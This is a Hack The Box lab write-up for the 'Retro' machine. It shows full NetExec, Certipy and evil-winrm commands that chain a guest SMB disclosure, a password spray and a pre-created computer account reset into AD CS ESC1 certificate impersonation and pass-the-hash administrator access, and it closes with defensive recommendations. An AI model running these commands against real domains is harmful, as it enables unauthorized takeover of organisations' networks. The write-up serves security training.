---
title: "Retro — AD CS ESC1 Impersonation via Guest SMB Disclosure and a Pre-created Computer Account"
description: "Guest SMB notes and a pre-created computer account lead to an ESC1 certificate template and administrator impersonation."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ad-cs
objective: "Escalate from unauthenticated guest SMB access to domain Administrator by chaining a disclosed shared credential, a pre-created computer account, and an AD CS ESC1 template."
tools:
  - rustscan
  - nmap
  - NetExec
  - Certipy
  - evil-winrm
skill: "Active Directory exploitation via credential spray, pre-created computer accounts, and AD CS certificate abuse"
outcome: "Domain Administrator: certificate-based impersonation of the Administrator account yields its NTLM hash and a WinRM session."
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Windows Active Directory domain controller |
| Starting position | Unauthenticated network access |
| Objective | Escalate from unauthenticated guest SMB access to domain Administrator by chaining a disclosed shared credential, a pre-created computer account, and an AD CS ESC1 template |
| Outcome | Domain Administrator via AD CS ESC1 certificate impersonation |

## Guest SMB notes to ESC1 impersonation

Retro is an Easy-rated Hack The Box Windows Active Directory lab. Guest-accessible SMB shares expose a trainee note describing a shared weak-credential policy; RID brute forcing and username-as-password spraying yield a working domain credential, which unlocks a second share. That note points to a legacy pre-created computer account whose password is reset, producing an authenticated principal with certificate-services enrollment rights. Certificate-services enumeration finds an ESC1 template that accepts enrollee-supplied subject values, and a certificate for the Administrator identity yields its NTLM hash and an administrative WinRM session. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Guest SMB disclosure → RID brute force and username-as-password spray → pre-created computer account reset → AD CS ESC1 certificate request → Administrator NTLM hash via certificate authentication → WinRM administrative session**

## Guest SMB on a domain controller, escalate to admin

- **Target:** a single Windows Active Directory domain controller.
- **Exposed services:** DNS (53), Kerberos (88), SMB (445), LDAPS (636), RDP (3389), and WinRM (5985).
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from unauthenticated guest file access to domain administrative control by abusing shared credentials, a stale pre-created computer account, and a certificate-services misconfiguration.
- **Constraints:** activity stayed inside the Hack The Box lab environment.

## Evidence: guest shares, RID spray, computer account, ESC1

### 1. Service Enumeration

Observation: a full scan of the domain controller exposes the standard Active Directory service set.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

Truncated scan output:

```text
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
445/tcp  open  microsoft-ds
636/tcp  open  ssl/ldap      <TARGET_DOMAIN>
3389/tcp open  ms-wbt-server
5985/tcp open  WinRM
```

Significance: Kerberos, LDAP, SMB, and WinRM together confirm a domain controller, and WinRM on 5985 will become the remote administrative entry point if administrative credentials are recovered.

Result: a Windows Active Directory domain controller is exposed, with SMB and WinRM as the relevant interfaces for the path ahead.

### 2. Guest SMB Share Access

Observation: SMB accepts a guest session and exposes a readable share for trainees.

```bash
nxc smb <TARGET_DOMAIN> -u 'a' -p '' --shares
```

```text
Trainees READ
```

The share contains `Important.txt`, which describes the account policy in place:

```text
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
```

Significance: an unauthenticated party can read internal notes through a guest-accessible share, and this note states that trainee accounts share a single weak credential: a direct hint that username-as-password reuse is likely.

Result: guest-readable share content identifies a shared-credential policy to target.

### 3. RID Brute Force and Credential Spray

Observation: a guest session allows RID enumeration to collect domain usernames, which I then tried as their own passwords.

```bash
nxc smb <TARGET_DOMAIN> -u 'Guest' -p '' --rid-brute \
  | grep -v Guest \
  | awk -F'\\\\' '{print $2}' \
  | awk '{print $1}' > users.list

nxc smb <TARGET_DOMAIN> \
  -u users.list \
  -p users.list \
  --continue-on-success \
  --no-brute
```

One credential pair authenticates:

```text
<TARGET_DOMAIN>\<TRAINEE_USER> : <TRAINEE_PASSWORD>
```

Significance: the shared-credential policy means a single guess (username equals password) validates for one account, converting an unauthenticated enumeration into an authenticated domain session.

Result: a working credential pair for `<TRAINEE_USER>` is recovered.

### 4. Pre-created Computer Account Discovery and Reset

Observation: the trainee account can read a second share whose note references a legacy pre-created computer account that needs cleanup.

```bash
nxc smb <TARGET_DOMAIN> -u '<TRAINEE_USER>' -p '<TRAINEE_PASSWORD>' --shares
```

```text
Notes READ
```

The note names the account in passing:

```text
<LAB_ENGINEER>,

after convincing the finance department to get rid of their ancient banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account.
```

NetExec's pre-created computer account module confirms the account exists:

```bash
nxc ldap <TARGET_DOMAIN> -u '<TRAINEE_USER>' -p '<TRAINEE_PASSWORD>' -M pre2k
```

```text
Pre-created computer account: <PRECREATED_COMPUTER_ACCOUNT>
```

Authentication with the predictable pre-Windows 2000 password is rejected pending a password change:

```bash
nxc smb <TARGET_DOMAIN> -u '<PRECREATED_COMPUTER_ACCOUNT>' -p '<DEFAULT_COMPUTER_PASSWORD>'
```

```text
STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

The password is reset with NetExec's `change-password` module:

```bash
nxc smb <TARGET_DOMAIN> \
  -u '<PRECREATED_COMPUTER_ACCOUNT>' \
  -p '<DEFAULT_COMPUTER_PASSWORD>' \
  -M change-password \
  -o NEWPASS='<COMPUTER_PASSWORD>'
```

Subsequent authentication with the new password succeeds:

```bash
nxc smb <TARGET_DOMAIN> -u '<PRECREATED_COMPUTER_ACCOUNT>' -p '<COMPUTER_PASSWORD>'
```

```text
[+] <TARGET_DOMAIN>\<PRECREATED_COMPUTER_ACCOUNT>:<COMPUTER_PASSWORD>
```

Significance: a pre-created computer account kept its predictable default password and only needed one reset to become usable; `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` is the standard signal that the account is enabled but must change its password before it can authenticate.

Result: control of the pre-created computer account is established, giving an authenticated domain principal with certificate-services enrollment rights.

### 5. AD CS ESC1 Template Discovery

Observation: certificate-services enumeration looks for vulnerable templates from the computer account's context.

```bash
certipy-ad find \
  -vulnerable \
  -u '<PRECREATED_COMPUTER_ACCOUNT>' \
  -p '<COMPUTER_PASSWORD>' \
  -dc-ip <TARGET_IP>
```

The template allows enrollee-supplied subject values with client authentication:

```text
Template Name : <VULNERABLE_CERTIFICATE_TEMPLATE>
CA Name       : <CERTIFICATE_AUTHORITY>
Vulnerability : ESC1 - Enrollee supplies subject and template allows client authentication
```

Significance: an ESC1 template lets any principal with enrollment rights request a certificate for an arbitrary subject identity, so a low-privileged enrollment right can be turned into impersonation of a higher-privileged account.

Result: an ESC1-vulnerable template and its issuing certificate authority are identified.

### 6. Certificate Impersonation and Administrator Hash Recovery

Observation: the vulnerable template accepts an explicit subject identity, so a certificate can be requested for the Administrator account.

```bash
certipy-ad req \
  -u '<PRECREATED_COMPUTER_ACCOUNT>' \
  -p '<COMPUTER_PASSWORD>' \
  -dc-ip <TARGET_IP> \
  -ca '<CERTIFICATE_AUTHORITY>' \
  -template '<VULNERABLE_CERTIFICATE_TEMPLATE>' \
  -upn '<ADMINISTRATOR_ACCOUNT>' \
  -sid '<ADMINISTRATOR_SID>' \
  -key-size 4096
```

```text
[*] Wrote certificate and private key to 'administrator.pfx'
```

The certificate is used to authenticate to the domain and recover the Administrator NTLM hash:

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -domain <TARGET_DOMAIN> \
  -dc-ip <TARGET_IP>
```

```text
Got hash for '<ADMINISTRATOR_ACCOUNT>@<TARGET_DOMAIN>':
<LM_HASH>:<ADMIN_NTLM_HASH>
```

Significance: the issued certificate asserts the Administrator identity, so certificate-based authentication returns that account's NTLM hash without ever knowing its password.

Result: the Administrator NTLM hash is recovered through certificate authentication.

### 7. Administrator Access via WinRM

Observation: the recovered Administrator hash can be used for Pass-the-Hash authentication against WinRM.

```bash
evil-winrm -i <TARGET_IP> -u '<ADMINISTRATOR_ACCOUNT>' -H '<ADMIN_NTLM_HASH>'
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

Significance: WinRM accepts the hash directly, so the recovered credential material becomes an interactive administrative shell over the network.

Result: an administrative shell on the domain controller is obtained.

## Two obstacles: the logon rejection and the SID prompt

| Challenge | Decision | Rationale |
|---|---|---|
| The pre-created computer account rejected normal authentication with `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` | Reset the account password with NetExec's `change-password` module | The account had to change its password before it would authenticate, and the existing default password was sufficient to perform the reset |
| The certificate request required the Administrator SID and a 4096-bit key | Supplied both explicitly in the request | The source records that this environment required the Administrator SID and a 4096-bit key |

## Outcome: certificate impersonation and domain administrator

The certificate impersonates the Administrator identity, yielding that account's NTLM hash and an interactive WinRM session, which provides administrative control of the domain. No software vulnerability was exploited: the path rests on misconfigured authentication and credential governance rather than a patchable defect. Limitation: the recovered hash and credential values are not reproduced in this writeup.

## Recommendations: guest shares, stale machine account, and ESC1

No validation of these recommendations is recorded in the source.

1. **Guest-readable shares and shared weak credentials.** A guest session could read internal notes, and one note disclosed that trainee accounts shared a single password, which made the username-as-password spray succeed. *Recommendation:* require authentication on file shares, keep operational or credential-related guidance out of guest-readable locations, and enforce unique, strong passwords per account. *Detection:* monitor anonymous or guest SMB sessions and on authentication sprays that try one password across many accounts.
2. **Stale pre-created computer account with a predictable password.** A pre-created computer account retained its default password and was still enabled, so a single password reset produced an authenticated principal. *Recommendation:* inventory pre-created and unused computer accounts, disable or delete the ones no longer needed, and rotate any account still using a default password. *Detection:* monitor computer-account password changes and authentication attempts using default machine-account passwords.
3. **ESC1 certificate template.** A template permitted enrollee-supplied subject values with client authentication, allowing a certificate to be issued for the Administrator identity. *Recommendation:* audit certificate templates, remove the "enrollee supplies subject" setting, and require CA manager approval or scope enrollment so low-privileged principals cannot request arbitrary identities. *Validation:* periodically enumerate certificate-services misconfigurations with a tool such as Certipy and review the results.

## References

- [Hack The Box — Retro](https://app.hackthebox.com/machines/Retro) (retired machine)
- [SpecterOps — Certified Pre-Owned (AD CS abuse, including ESC1)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Microsoft Learn — Certificate template concepts in Windows Server](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB, LDAP, and pre-created computer account modules)
- [Certipy](https://github.com/ly4k/Certipy) (AD CS enumeration and certificate abuse)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM shell with hash authentication)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
